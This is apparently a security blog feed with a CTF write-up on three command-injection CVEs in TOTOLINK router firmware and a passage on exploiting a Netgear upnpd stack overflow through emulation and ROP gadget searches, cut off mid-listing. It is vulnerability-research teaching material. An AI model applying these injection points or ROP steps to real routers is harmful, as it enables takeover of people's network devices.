title="totox/3"></a>totox/3</h2><p><strong>题目描述：</strong>生死竞速，本题分为三题，需要选手从三个不同路径（不同路径指从三个不同实际产生命令注入、破坏堆栈结构等内容）实现对TOTOLINK的攻击。</p><p>这其实是一个路由器题目， 主办方要求我们通过三个不同的路径攻破该路由器， 即需要使用到三个不同的漏洞。 固件版本为： X5000R_固件_V9.1.0u.6118_B20201102</p><p>通过网上查阅资料， 我们发现该款路由器拥有许多的 CVE 编号， 并且题目的这个版本是受到影响的。这里简单分析下我们用到的三个漏洞</p><h3 id="totox-1-CVE-2021-27710"><a href="#totox-1-CVE-2021-27710" class="headerlink" title="totox/1 CVE-2021-27710"></a>totox/1 CVE-2021-27710</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:0044A520 aSettraceroutec:.ascii &quot;setTracerouteCfg&quot;&lt;0&gt;</span><br><span class="line">.data:0044A531                 .byte 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br><span class="line">.data:0044A531                 .byte 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br><span class="line">.data:0044A531                 .byte 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br><span class="line">.data:0044A560                 .word sub_41F6A0</span><br></pre></td></tr></table></figure><p>在cstecgi.cgi中的<code>setTracerouteCfg</code> 接口会调用 <code>sub_41F6A0</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_41F7E8</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *Var; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">128</span>]; <span class="comment">// [sp+18h] [-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  Var = (<span class="keyword">const</span> <span class="keyword">char</span> *)websGetVar(a1, <span class="string">&quot;ip&quot;</span>, <span class="string">&quot;www.baidu.com&quot;</span>);</span><br><span class="line">  v3 = websGetVar(a1, <span class="string">&quot;num&quot;</span>, &amp;byte_437F70);</span><br><span class="line">  v4 = atoi(v3);</span><br><span class="line">  <span class="built_in">sprintf</span>(v6, <span class="string">&quot;ping %s -w %d &amp;&gt;/var/log/pingCheck&quot;</span>, Var, v4);</span><br><span class="line">  doSystem(v6);</span><br><span class="line">  setResponse(&amp;word_436104, <span class="string">&quot;reserv&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处的 <code>ip</code> 参数可控，存在命令注入。</p><h3 id="totox-2-CVE-2021-27708"><a href="#totox-2-CVE-2021-27708" class="headerlink" title="totox/2 CVE-2021-27708"></a>totox/2 CVE-2021-27708</h3><p>在cstecgi.cgi中的函数 <code>sub_41F6A0</code> ， 即 <code>setTracerouteCfg</code> 接口有如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *Var; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">128</span>]; <span class="comment">// [sp+18h] [-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  Var = (<span class="keyword">const</span> <span class="keyword">char</span> *)websGetVar(a1, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;www.baidu.com&quot;</span>);</span><br><span class="line">  v3 = websGetVar(a1, <span class="string">&quot;num&quot;</span>, &amp;byte_437F70);</span><br><span class="line">  v4 = atoi(v3);</span><br><span class="line">  <span class="built_in">sprintf</span>(v6, <span class="string">&quot;traceroute -m %d %s&amp;&gt;/var/log/traceRouteLog&quot;</span>, v4, Var);</span><br><span class="line">  doSystem(v6);</span><br><span class="line">  setResponse(&amp;word_436104, <span class="string">&quot;reserv&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>command</code>  参数可控， 存在命令注入。</p><h3 id="totox-3-CVE-2022-27005"><a href="#totox-3-CVE-2022-27005" class="headerlink" title="totox/3 CVE-2022-27005"></a>totox/3 CVE-2022-27005</h3><p>在cstecgi.cgi中的 <code>setWanCfg</code> 接口中 ， 即 <code>sub_4212CC</code> 函数里，有如下代码片断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">strcpy</span>(v61, <span class="string">&quot;dhcp&quot;</span>);</span><br><span class="line">    v48 = (<span class="keyword">const</span> <span class="keyword">char</span> *)websGetVar(a1, <span class="string">&quot;hostName&quot;</span>, &amp;byte_437F70);</span><br><span class="line">    <span class="keyword">if</span> ( *v48 )</span><br><span class="line">    &#123;</span><br><span class="line">      nvram_set(<span class="string">&quot;wan_hostname&quot;</span>, v48);</span><br><span class="line">      doSystem(<span class="string">&quot;echo  &#x27;%s&#x27;  &gt; /proc/sys/kernel/hostname&quot;</span>, v48);</span><br><span class="line">    &#125;</span><br><span class="line">    v49 = websGetVar(a1, <span class="string">&quot;dhcpMtu&quot;</span>, <span class="string">&quot;1500&quot;</span>);</span><br><span class="line">    nvram_set(<span class="string">&quot;wan_mtu&quot;</span>, v49);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中， <code>hostname</code> 可被用户控制， 存在命令注入。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/neutrinolabs/xrdp/commit/4def30ab8ea445cdc06832a44c3ec40a506a0ffa">CVE-2022-23613-Patched</a></p><p><a href="https://hackmd.io/KjXzQdjDRjOuRjoZZXQo_A">CVE-2021-27710 totolink command inject</a></p><p><a href="https://hackmd.io/7FtB06f-SJ-SCfkMYcXYxA">CVE-2021-27008 totolink command inject</a></p><p><a href="https://web.archive.org/web/20220322013544/https://github.com/wudipjq/my_vuln/blob/main/totolink/vuln_30/30.md">CVE-2022-27005 totolink command inject</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2022-23613" scheme="https://bestwing.me/tags/CVE-2022-23613/"/>
    
    <category term="CVE-2022-27005" scheme="https://bestwing.me/tags/CVE-2022-27005/"/>
    
    <category term="CVE-2021-27710" scheme="https://bestwing.me/tags/CVE-2021-27710/"/>
    
    <category term="CVE-2021-27708" scheme="https://bestwing.me/tags/CVE-2021-27708/"/>
    
  </entry>
  
  <entry>
    <title>PSV-2020-0437:Buffer-Overflow-on-Some-Netgear-Routers</title>
    <link href="https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html"/>
    <id>https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html</id>
    <published>2022-06-30T13:43:00.000Z</published>
    <updated>2022-06-30T14:54:17.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>距离上一篇 Blog 更新已经快两个月了，想了想应该给长草的 Blog 除除草了。于是从我的笔记文档里翻了一下， 把这个漏洞翻出来给大家分享分享。具体官方通告可以参考： </p><p>【1】<a href="https://kb.netgear.com/000064493/Security-Advisory-for-Post-Authentication-Buffer-Overflow-on-Some-Routers-Extenders-and-WiFi-Systems-PSV-2020-0437">PSV-2020-0437 官方公告</a></p><p>当时我的利用是在 Netgear R6400v2 固件版本为 1.0.4.102 的环境下编写的 ，因此本篇文章也以此为基础进行讲述。</p><h2 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h2><p>固件下载链接: 【2】<a href="https://www.downloads.netgear.com/files/GDC/R6400v2/R6400v2-V1.0.4.102_10.0.75.zip">R6400v2-1.0.4.102 固件</a></p><p>当我们获取固件后，我们需要从中解压出文件系统 ， 这里我通过 binwalk 和 unsquashfs 成功提取出对应的固件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeiMac in ~/Downloads/PSV-2020-0437 [16:43:07]</span></span><br><span class="line">$ msl --run <span class="string">&quot;binwalk R6400v2-V1.0.4.102_10.0.75.chk -ez --run-as=root&quot;</span></span><br><span class="line">[check_container() - msl:93 ] Container status: running</span><br><span class="line">[main() - msl:139 ] Running <span class="built_in">command</span>: bash -c <span class="string">&quot;cd &#x27;/workhub/Downloads/PSV-2020-0437&#x27; ; binwalk R6400v2-V1.0.4.102_10.0.75.chk -ez --run-as=root&quot;</span></span><br><span class="line"></span><br><span class="line">__________               .__  .__  _____</span><br><span class="line">\______   \__  _  ______ |  | |__|/ ____\____</span><br><span class="line"> |     ___/\ \/ \/ /    \|  | |  \   __\/ __ \</span><br><span class="line"> |    |     \     /   |  \  |_|  ||  | \  ___/</span><br><span class="line"> |____|      \/\_/|___|  /____/__||__|  \___  &gt;</span><br><span class="line">                       \/                   \/</span><br><span class="line">                                 no pwn no life</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">58            0x3A            TRX firmware header, little endian, image size: 46354432 bytes, CRC32: 0x93E72BAF, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x20BCFC, rootfs offset: 0x0</span><br><span class="line">86            0x56            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5276608 bytes</span><br><span class="line">2145590       0x20BD36        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 44208035 bytes, 1807 inodes, blocksize: 131072 bytes, created: 2020-09-22 07:41:07</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ docker-desktop in /workhub/Downloads/PSV-2020-0437/_R6400v2-V1.0.4.102_10.0.75.chk.extracted [8:44:40]</span></span><br><span class="line">$ ls</span><br><span class="line">20BD36.squashfs  56.7z</span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ docker-desktop in /workhub/Downloads/PSV-2020-0437/_R6400v2-V1.0.4.102_10.0.75.chk.extracted [8:44:43]</span></span><br><span class="line">$ unsquashfs 20BD36.squashfs</span><br><span class="line">Parallel unsquashfs: Using 8 processors</span><br><span class="line">1694 inodes (2629 blocks) to write</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_xattr: failed to write xattr security.selinux <span class="keyword">for</span> file squashfs-root/bin/addgroup because extended attributes are not supported by the destination filesystem</span><br><span class="line"></span><br><span class="line">Ignoring xattrs <span class="keyword">in</span> filesystem</span><br><span class="line"></span><br><span class="line">To avoid this error message, specify -no-xattrs</span><br><span class="line">[==========================================================================================================================================================================================================================| ] 2628/2629  99%</span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ docker-desktop in /workhub/Downloads/PSV-2020-0437/_R6400v2-V1.0.4.102_10.0.75.chk.extracted [8:44:50] C:2</span></span><br><span class="line">$ ls squashfs-root</span><br><span class="line">bin  data  dev  etc  lib  media  mnt  opt  proc  sbin  share  sys  tmp  usr  var  www</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>众所周知 UPNP相关的程序在路由器上是经常出现漏洞的。这次也不例外， PSV-2020-0437 的漏洞也是出现在 UPNP 的相关处理代码中。我们从刚解压出来的文件系统中提取出 upnpd 程序， 然后我们用 ida pro 打开。</p><p>我们通过对 <code>recvfrom</code> 交叉引用， 找到程序的入口， 可以看该程序一开始可读入大小为 0x1fff 。 </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-4f5f19e512603a50cdad71767a640d93-4d05b2.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-4f5f19e512603a50cdad71767a640d93-4d05b2.png"></a></p><p>然后我们跟着数据流， 即 <code>inputBuf</code>  ，我们看到程序会调用 <code>ssdp_http_method_check</code> 函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-90a47c3ad6603c1ba944071dad48f657-062389.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-90a47c3ad6603c1ba944071dad48f657-062389.png"></a></p><p>该函数会对输入的数据进行部分解析，例如 <code>M-SEARCH</code> 、<code>ssdp:discover</code>  等关键词， 本次的漏洞是在 <code>sub_22D20</code> 函数中发生的， 我们点进去查看下这个函数。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-809c95a4a9780fe12cceb4b95900e51a-9da086.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-809c95a4a9780fe12cceb4b95900e51a-9da086.png"></a></p><p>通过阅读上面的代码， 我们会发现该函数在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncpy</span>((<span class="keyword">char</span> *)v6, (<span class="keyword">const</span> <span class="keyword">char</span> *)(MXstart + <span class="number">3</span>), end - (MXstart + <span class="number">3</span>));</span><br></pre></td></tr></table></figure><p>使用 <code>strncpy</code> 的时候，拷贝的长度计算上处理不当，会在此处产生栈溢出。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>由于当时手头没有 RV6400v2 的设备， 因此我采取使用 qemu-user 进行模拟的方案。 </p><p>具体几个踩坑以及解决方案如下：</p><ol><li> <code>/dev/nvram: No such file or directory</code></li></ol><p>由于 netgear 使用到了 NVRAM ， 因此我们需要 hook 下 NVRAM 相关的函数， 这里我用的一个网上编译好的实现 ：【3】 <a href="https://github.com/therealsaumil/custom_nvram">Shared Library to intercept nvram</a></p><ol start="2"><li>缺失符号</li></ol><p>找不到 dlsym 的符号。之所以会用到 dlsym，是因为该库的实现者还同时 hook 了 system、fopen、open 等函数</p><p><code>/lib/libdl.so.0</code> 导出了该符号,所以 LD_PRELOAD 的时候把这个也加上</p><ol start="3"><li>缺少一些目录以及配置信息</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat tmp/nvram.ini</span></span><br><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=172.19.32.152</span><br><span class="line">hwver=R6400</span><br><span class="line">friendly_name=R6400</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure><ol start="4"><li> 挂载 /proc /dev 目录<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">mount -o <span class="built_in">bind</span> /dev ./squashfs-root/dev</span><br></pre></td></tr></table></figure></li></ol><p>到这我们就基本利用正常运行 upnpd 程序了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ server in /home/squashfs-root [19:32:11]</span></span><br><span class="line">$ chroot . sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BusyBox v1.7.2 (2020-09-18 17:38:05 CST) built-in shell (ash)</span><br><span class="line">Enter <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> a list of built-in commands.</span><br><span class="line"></span><br><span class="line"><span class="comment"># LD_PRELOAD=&quot;/custom_nvram.so /lib/libdl.so.0&quot; ./usr/sbin/upnpd</span></span><br><span class="line"><span class="comment"># [0x0002465c] fopen(&#x27;/var/run/upnpd.pid&#x27;, &#x27;wb+&#x27;) = 0x000db150</span></span><br><span class="line">[0x00024688] custom_nvram initialised</span><br><span class="line">[0xff757d34] fopen(<span class="string">&#x27;/tmp/nvram.ini&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) = 0x000db150</span><br><span class="line">[nvram 0] upnpd_debug_level = 9</span><br><span class="line">[nvram 1] lan_ipaddr = 127.0.0.1</span><br><span class="line">[nvram 2] hwver = R6400</span><br><span class="line">[nvram 3] friendly_name = R6400</span><br><span class="line">[nvram 4] upnp_enable = 1</span><br><span class="line">[nvram 5] upnp_turn_on = 1</span><br><span class="line">[nvram 6] upnp_advert_period = 30</span><br><span class="line">[nvram 7] upnp_advert_ttl = 4</span><br><span class="line">[nvram 8] upnp_portmap_entry = 1</span><br><span class="line">[nvram 9] upnp_duration = 3600</span><br><span class="line">[nvram 10] upnp_DHCPServerConfigurable = 1</span><br><span class="line">[nvram 11] wps_is_upnp = 0</span><br><span class="line">[nvram 12] upnp_sa_uuid = 00000000000000000000</span><br><span class="line">[nvram 13] lan_hwaddr = AA:BB:CC:DD:EE:FF</span><br><span class="line">[nvram 14] lan_hwaddr =</span><br><span class="line">Read 15 entries from /tmp/nvram.ini</span><br><span class="line">acosNvramConfig_get(<span class="string">&#x27;upnpd_debug_level&#x27;</span>) = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">[0x00024728] acosNvramConfig_get(<span class="string">&#x27;upnpd_debug_level&#x27;</span>) = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">set_value_to_org_xml:1136()</span><br><span class="line">[0x0000e5e8] fopen(<span class="string">&#x27;/www/Public_UPNP_gatedesc.xml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) = 0x000db150</span><br><span class="line">[0x0000e620] fopen(<span class="string">&#x27;/tmp/upnp_xml&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) = 0x000db150</span><br><span class="line">data2XML()</span><br><span class="line">[0x0000f7d0] acosNvramConfig_get(<span class="string">&#x27;lan_ipaddr&#x27;</span>) = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br></pre></td></tr></table></figure><p>PS: 操作的过程没有看到 qemu， 那是因为我系统有 qemu binfmt 的支持。</p><h2 id="利用编写"><a href="#利用编写" class="headerlink" title="利用编写"></a>利用编写</h2><p>由于漏洞的根本原因是 <code>strncpy</code> 的缓冲区溢出， 我们知道 <code>strncpy</code> 函数在溢出的时候会存在 <code>\x00</code> 截断。然而程序每次不同链接使用的是同一块内存， 我们可以在第一次 <code>recvfrom</code> 的时候在栈上布局好 rop, 然后通过栈迁移跳转到布局好的 rop 上。</p><ol><li> 第一次连接布局好 rop</li><li>第二次连接, 构造缓冲区溢出，栈迁移到 rop 上，然后执行任意命令</li></ol><p>整体思路可以参考 【4】<a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">SSD Advisory - Netgear Nighthawk R8300 upnpd PreAuth RCE - SSD Secure Disclosure (ssd-disclosure.com)</a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-72c8aa776b04fb7ce53044c6d1e8728d-c1cff6.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-72c8aa776b04fb7ce53044c6d1e8728d-c1cff6.png"></a></p><p>明确了思路我们就需要开始构造 rop， 找齐所需的 gadget 。</p><p>通过查看 <code>sub_22D20</code> 函数返回的地方汇编可知， 栈溢出后，我们可控的寄存器为 <code>R4、R5、R6、PC</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">loc_22DB8</span><br><span class="line">MOV             R0, R4</span><br><span class="line">ADD             SP, SP, #0x80</span><br><span class="line">POP             &#123;R4-R6,PC&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>PC</code> 寄存器为需要的栈迁移 gadget </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f usr/sbin/upnpd --search <span class="string">&quot;add sp, sp&quot;</span></span><br></pre></td></tr></table></figure><p>这里我选择了这条 gadget, 将栈迁移到 <code>SP+0x800</code> 的位置， 另外通过这条 gadget 我可以接着控制 <code>R4、R5、R6、PC</code>  四个寄存器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00011B90                 ADD             SP, SP, #0x800</span><br><span class="line">.text:00011B94                 POP             &#123;R4-R6,PC&#125;</span><br></pre></td></tr></table></figure><p>另外最终我期望通过调用 <code>system</code> 函数执行任意命令， 因此我需要在 bss 这样全局的地址上写入命令， 因此我需要找对应可以往任意地址写入值的 gadget 。 在 arm 的汇编中，写入值的汇编指令为 <code>str</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ ropper -f usr/sbin/upnpd --search <span class="string">&quot;str r?&quot;</span></span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: str r?</span><br><span class="line"></span><br><span class="line">[INFO] File: usr/sbin/upnpd</span><br><span class="line">0x000299e8: str r0, [r3, <span class="comment">#0x214]; pop &#123;r3, r4, r5, pc&#125;;</span></span><br><span class="line">0x000167e0: str r0, [r4, <span class="comment">#0x40]; ldr r3, [pc, #0x54]; mvn r2, #0; mov r0, #0; str r2, [r3, #4]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x0000ba2c: str r0, [r5]; mov r0, r4; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span><br><span class="line">0x0002d448: str r2, [r3, <span class="comment">#-0x974]; bl #0x3bf4; movw r0, #0x1f5; pop &#123;r3, r4, r5, pc&#125;;</span></span><br><span class="line">0x0002d468: str r2, [r3, <span class="comment">#-0x974]; pop &#123;r3, r4, r5, pc&#125;;</span></span><br><span class="line">0x0002b360: str r2, [r3, <span class="comment">#0x248]; pop &#123;r3, pc&#125;;</span></span><br><span class="line">0x000182ec: str r2, [r3, <span class="comment">#4]; bx lr;</span></span><br><span class="line">0x000167f0: str r2, [r3, <span class="comment">#4]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x0002b458: str r2, [r3]; add sp, sp, <span class="comment">#0x10; pop &#123;r4, r5, r6, pc&#125;;</span></span><br><span class="line">0x0002af38: str r2, [r3]; bl <span class="comment">#0x326c; mov r0, r5; add sp, sp, #0x50; pop &#123;r4, r5, r6, pc&#125;;</span></span><br><span class="line">0x0000ba6c: str r2, [r3]; bx lr;</span><br><span class="line">0x0000ba60: str r2, [r3]; mov r2, <span class="comment">#7; ldr r3, [sp, #4]; str r2, [r3]; bx lr;</span></span><br><span class="line">0x00017da0: str r2, [r3]; pop &#123;r3, pc&#125;;</span><br><span class="line">0x0002b524: str r2, [r3]; pop &#123;r4, pc&#125;;</span><br><span class="line">0x0000f120: str r3, [ip]; bl <span class="comment">#0x2e94; mov r0, #0; add sp, sp, #0xc; pop &#123;r4, r5, pc&#125;;</span></span><br><span class="line">0x00029950: str r3, [r2, <span class="comment">#0x200]; pop &#123;r3, r4, r5, pc&#125;;</span></span><br><span class="line">0x000182fc: str r3, [r2, <span class="comment">#4]; bx lr;</span></span><br><span class="line">0x00013d80: str r3, [r2]; mov r0, <span class="comment">#0; add sp, sp, #0x2c; add sp, sp, #0x800; pop &#123;r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x00013900: str r3, [r2]; mov r0, <span class="comment">#0; add sp, sp, #0x800; pop &#123;r4, r5, r6, pc&#125;;</span></span><br><span class="line">0x00013af4: str r3, [r2]; mov r0, <span class="comment">#0; add sp, sp, #4; add sp, sp, #0x1000; pop &#123;r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x00017d64: str r3, [r4, <span class="comment">#0x140]; pop 